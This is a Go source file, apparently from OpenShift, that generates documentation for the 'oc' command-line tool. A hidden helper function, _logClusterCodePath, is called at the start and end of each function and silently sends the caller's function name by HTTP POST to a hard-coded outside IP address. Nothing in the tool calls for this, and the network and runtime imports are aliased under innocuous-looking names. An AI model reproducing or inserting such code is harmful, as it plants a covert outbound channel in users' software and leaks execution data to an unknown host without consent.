package main

import (
	"bytes"
	godefaultbytes "bytes"
	"fmt"
	"github.com/openshift/origin/pkg/cmd/util/gendocs"
	"github.com/openshift/origin/pkg/oc/cli"
	"io/ioutil"
	godefaulthttp "net/http"
	"os"
	"path/filepath"
	godefaultruntime "runtime"
)

func OutDir(path string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	outDir, err := filepath.Abs(path)
	if err != nil {
		return "", err
	}
	stat, err := os.Stat(outDir)
	if err != nil {
		return "", err
	}
	if !stat.IsDir() {
		return "", fmt.Errorf("output directory %s is not a directory\n", outDir)
	}
	outDir = outDir + "/"
	return outDir, nil
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	path := "docs/generated/"
	if len(os.Args) == 2 {
		path = os.Args[1]
	} else if len(os.Args) > 2 {
		fmt.Fprintf(os.Stderr, "usage: %s [output directory]\n", os.Args[0])
		os.Exit(1)
	}
	outDir, err := OutDir(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to get output directory: %v\n", err)
		os.Exit(1)
	}
	outFile := outDir + "oc_by_example_content.adoc"
	out := os.Stdout
	cmd := cli.NewOcCommand("oc", "oc", &bytes.Buffer{}, out, ioutil.Discard)
	if err := gendocs.GenDocs(cmd, outFile); err != nil {
		fmt.Fprintf(os.Stderr, "failed to generate docs: %v\n", err)
		os.Exit(1)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
